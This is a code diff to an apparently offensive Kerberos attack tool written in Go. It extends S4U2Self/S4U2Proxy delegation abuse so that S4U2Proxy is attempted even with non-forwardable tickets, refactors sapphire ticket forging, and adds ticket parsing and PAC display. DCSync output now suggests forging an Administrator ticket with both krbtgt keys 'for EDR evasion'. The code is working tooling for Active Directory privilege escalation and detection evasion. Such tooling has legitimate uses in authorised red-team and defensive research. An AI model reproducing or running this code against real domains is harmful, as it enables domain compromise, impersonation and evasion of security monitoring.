@@ -134,7 +134,19 @@ func cmdAskTGS(args []string) error {
 
 // cmdS4U handles S4U delegation attacks.
 func cmdS4U(args []string) error {
-	if len(args) == 0 {
+	// Filter out flag-like args that were meant for the global parser
+	// but ended up here (cli library stops parsing at first positional arg).
+	var positional []string
+	for i := 0; i < len(args); i++ {
+		if (args[i] == "-o" || args[i] == "--out") && i+1 < len(args) {
+			flags.outfile = args[i+1]
+			i++ // skip the value
+		} else if !strings.HasPrefix(args[i], "-") {
+			positional = append(positional, args[i])
+		}
+	}
+
+	if len(positional) == 0 {
 		return fmt.Errorf("target user required")
 	}
 
@@ -143,19 +155,30 @@ func cmdS4U(args []string) error {
 		return err
 	}
 
-	targetUser := args[0]
+	targetUser := positional[0]
 	targetSPN := ""
-	if len(args) > 1 {
-		targetSPN = args[1]
+	if len(positional) > 1 {
+		targetSPN = positional[1]
 	}
 
 	// S4U2Self
+	// ServiceName must be our own username for U2U — we're requesting
+	// a ticket TO OURSELVES on behalf of targetUser. The KDC encrypts
+	// the result with our TGT session key (ENC-TKT-IN-SKEY).
+	serviceName := flags.username
+	if serviceName == "" && tgt.CredInfo != nil && len(tgt.CredInfo.TicketInfo) > 0 {
+		if names := tgt.CredInfo.TicketInfo[0].PName.NameString; len(names) > 0 {
+			serviceName = names[0]
+		}
+	}
+
 	s4uSelfReq := &client.S4U2SelfRequest{
-		TGT:        tgt,
-		SessionKey: sessionKey,
-		TargetUser: targetUser,
-		Domain:     flags.domain,
-		KDC:        flags.kdc,
+		TGT:         tgt,
+		SessionKey:  sessionKey,
+		TargetUser:  targetUser,
+		ServiceName: serviceName,
+		Domain:      flags.domain,
+		KDC:         flags.kdc,
 	}
 
 	s4uSelfResult, err := client.S4U2Self(s4uSelfReq)
@@ -165,13 +188,67 @@ func cmdS4U(args []string) error {
 
 	fmt.Printf("[+] S4U2Self ticket for %s (forwardable: %v)\n", targetUser, s4uSelfResult.Forwardable)
 
+	// Decrypt the S4U2Self ticket and show the PAC.
+	// The ticket is encrypted with the TGT session key (U2U: ENC-TKT-IN-SKEY).
+	etype := 18 // AES256
+	if len(sessionKey) == 16 {
+		etype = 23 // RC4
+	}
+	pacData, err := decryptTicketAndExtractPAC(s4uSelfResult.Kirbi, sessionKey, etype)
+	if err != nil {
+		fmt.Printf("[!] PAC extraction failed: %v\n", err)
+	} else if len(pacData) > 0 {
+		decodedPAC, err := pac.DecodePAC(pacData)
+		if err != nil {
+			fmt.Printf("[!] PAC decode failed: %v\n", err)
+		} else {
+			fmt.Println()
+			fmt.Println("╔══════════════════════════════════════════════════════════════════════════════╗")
+			fmt.Printf("║ S4U2Self+U2U PAC for: %-55s ║\n", targetUser)
+			fmt.Println("╠══════════════════════════════════════════════════════════════════════════════╣")
+			fmt.Printf("  User SID:         %s\n", decodedPAC.UserSID)
+			fmt.Printf("  Domain Admin:     %v\n", decodedPAC.IsDomainAdmin)
+			fmt.Printf("  Enterprise Admin: %v\n", decodedPAC.IsEnterpriseAdmin)
+			fmt.Printf("  Builtin Admin:    %v\n", decodedPAC.IsBuiltinAdmin)
+			fmt.Println("  ────────────────────────────────────────────────────────────────────────────")
+			fmt.Printf("  Groups (%d):\n", len(decodedPAC.Groups))
+			for _, g := range decodedPAC.Groups {
+				fmt.Printf("    - %s\n", g)
+			}
+			if len(decodedPAC.ExtraSIDs) > 0 {
+				fmt.Println("  ────────────────────────────────────────────────────────────────────────────")
+				fmt.Printf("  Extra SIDs (%d):\n", len(decodedPAC.ExtraSIDs))
+				for _, s := range decodedPAC.ExtraSIDs {
+					label := ""
+					if s == "S-1-18-1" {
+						label = " ← AUTHENTICATION AUTHORITY (normal AS-REQ)"
+					} else if s == "S-1-18-2" {
+						label = " ← SERVICE ASSERTED (S4U2Self!)"
+					}
+					fmt.Printf("    - %s%s\n", s, label)
+				}
+			}
+			fmt.Println("  ────────────────────────────────────────────────────────────────────────────")
+			fmt.Printf("  UserFlags: 0x%X\n", decodedPAC.UserFlags)
+			if decodedPAC.HasServiceAssertedIdentity {
+				fmt.Println("  S-1-18-2 PRESENT — confirms S4U2Self+U2U was used")
+			} else if decodedPAC.HasAuthAssertedIdentity {
+				fmt.Println("  S-1-18-1 present — normal authentication (not S4U2Self)")
+			}
+			fmt.Println("╚══════════════════════════════════════════════════════════════════════════════╝")
+		}
+	}
+
 	if targetSPN == "" {
 		return outputTicket(s4uSelfResult.Kirbi)
 	}
 
 	// S4U2Proxy
+	// Don't gate on forwardable — with RBCD the KDC accepts non-forwardable
+	// evidence tickets. Let the KDC decide and return an error if it rejects.
 	if !s4uSelfResult.Forwardable {
-		return fmt.Errorf("S4U2Self ticket not forwardable, cannot do S4U2Proxy")
+		fmt.Println("[!] S4U2Self ticket is NOT forwardable (no TRUSTED_TO_AUTH_FOR_DELEGATION)")
+		fmt.Println("[*] Attempting S4U2Proxy anyway (works with RBCD)...")
 	}
 
 	s4uProxyReq := &client.S4U2ProxyRequest{
@@ -443,6 +520,25 @@ func cmdSapphire(args []string) error {
 	fmt.Println("═══════════════════════════════════════════════════════════════")
 	fmt.Println()
 
+	// Use existing TGT if provided, otherwise ensure credentials first
+	var tgt *ticket.Kirbi
+	var sessionKey []byte
+	if flags.ticket != "" {
+		kirbi, err := ticket.LoadKirbi(flags.ticket)
+		if err != nil {
+			return fmt.Errorf("failed to load TGT: %w", err)
+		}
+		tgt = kirbi
+		if kirbi.SessionKey() != nil {
+			sessionKey = kirbi.SessionKey().KeyValue
+		}
+	} else {
+		// Prompt for password if no TGT and no credentials provided
+		if err := ensureCredentials(); err != nil {
+			return err
+		}
+	}
+
 	req := &forge.SapphireTicketRequest{
 		Domain:       flags.domain,
 		DomainSID:    domainSID,
@@ -453,23 +549,8 @@ func cmdSapphire(args []string) error {
 		KrbtgtNTHash: krbtgtNTHash,
 		KrbtgtAES256: krbtgtAES256,
 		KDC:          flags.kdc,
-	}
-
-	// Use existing TGT if provided
-	if flags.ticket != "" {
-		kirbi, err := ticket.LoadKirbi(flags.ticket)
-		if err != nil {
-			return fmt.Errorf("failed to load TGT: %w", err)
-		}
-		req.TGT = kirbi
-		if kirbi.SessionKey() != nil {
-			req.SessionKey = kirbi.SessionKey().KeyValue
-		}
-	} else {
-		// Prompt for password if no TGT and no credentials provided
-		if err := ensureCredentials(); err != nil {
-			return err
-		}
+		TGT:          tgt,
+		SessionKey:   sessionKey,
 	}
 
 	result, err := forge.ForgeSapphireTicket(context.Background(), req)
@@ -642,25 +723,54 @@ func cmdChangepw(args []string) error {
 func cmdDescribe(args []string) error {
 	// Parse flags
 	fs := flag.NewFlagSet("describe", flag.ExitOnError)
-	var keyStr string
+	var keyStr, ticketPath string
+	var checkAnomalies bool
 	fs.StringVar(&keyStr, "k", "", "Krbtgt key (AES256/AES128/RC4 hex) to decrypt ticket")
 	fs.StringVar(&keyStr, "key", "", "Krbtgt key (AES256/AES128/RC4 hex) to decrypt ticket")
+	fs.StringVar(&ticketPath, "t", "", "Path to ticket file (.kirbi)")
+	fs.StringVar(&ticketPath, "ticket", "", "Path to ticket file (.kirbi)")
+	fs.BoolVar(&checkAnomalies, "anomaly", false, "Run anomaly detection to check for potential SSPI/EDR issues")
+	fs.BoolVar(&checkAnomalies, "a", false, "Run anomaly detection (shorthand)")
 	fs.Parse(args)
 
 	// Get remaining args after flags
 	remainingArgs := fs.Args()
 
-	ticketPath := flags.ticket
-	if len(remainingArgs) > 0 {
+	// Accept ticket from: local flag, global flag, or positional arg
+	if ticketPath == "" {
+		ticketPath = flags.ticket
+	}
+	if ticketPath == "" && len(remainingArgs) > 0 {
 		ticketPath = remainingArgs[0]
 	}
 	if ticketPath == "" {
-		return fmt.Errorf("ticket path required")
+		return fmt.Errorf("ticket path required (-t or as argument)")
 	}
 
-	kirbi, err := ticket.LoadKirbi(ticketPath)
+	// Auto-detect file format (kirbi vs ccache)
+	data, err := os.ReadFile(ticketPath)
 	if err != nil {
-		return err
+		return fmt.Errorf("failed to read ticket file: %w", err)
+	}
+
+	var kirbi *ticket.Kirbi
+	if len(data) > 2 && (data[0] == 0x05 && (data[1] == 0x03 || data[1] == 0x04)) {
+		// CCache format (version 0x0503 or 0x0504)
+		fmt.Println("[*] Detected ccache format, converting to kirbi...")
+		cc, err := ticket.LoadCCache(ticketPath)
+		if err != nil {
+			return fmt.Errorf("failed to parse ccache: %w", err)
+		}
+		kirbi, err = cc.ToKirbi()
+		if err != nil {
+			return fmt.Errorf("failed to convert ccache to kirbi: %w", err)
+		}
+	} else {
+		// Kirbi format
+		kirbi, err = ticket.LoadKirbi(ticketPath)
+		if err != nil {
+			return err
+		}
 	}
 
 	// If key provided, set it for decryption
@@ -690,6 +800,12 @@ func cmdDescribe(args []string) error {
 	// Use ticket viewer
 	view := ticket.ViewTicket(kirbi, ticket.ViewOptions{Verbose: flags.verbose, DecryptKey: kirbi.DecryptKey})
 	fmt.Println(view.String())
+
+	// Run anomaly detection if requested
+	if checkAnomalies {
+		checks := ticket.CheckForAnomalies(kirbi)
+		fmt.Println(ticket.FormatAnomalyChecks(checks))
+	}
 
 	// If key provided, try to decrypt ticket and decode PAC
 	if len(keyBytes) > 0 && kirbi.Ticket() != nil {
@@ -1499,8 +1615,12 @@ func printDCSyncResult(result *dcsync.DCSyncResult, targetUser string) {
 	fmt.Println("───────────────────────────────────────────────────────────────")
 	fmt.Println("NEXT STEPS:")
 	if targetUser == "krbtgt" {
-		fmt.Println("  Use with sapphire tickets:")
-		if len(result.AES256) == 32 {
+		fmt.Println("  Use with sapphire tickets (recommended: provide BOTH keys for EDR evasion):")
+		// Show both keys if available for best evasion
+		if len(result.AES256) == 32 && len(result.NTHash) == 16 {
+			fmt.Printf("    goobeus sapphire --impersonate Administrator --aeskey %s --nthash %s\n",
+				hex.EncodeToString(result.AES256), hex.EncodeToString(result.NTHash))
+		} else if len(result.AES256) == 32 {
 			fmt.Printf("    goobeus sapphire --impersonate Administrator --aeskey %s\n",
 				hex.EncodeToString(result.AES256))
 		} else if len(result.NTHash) == 16 {
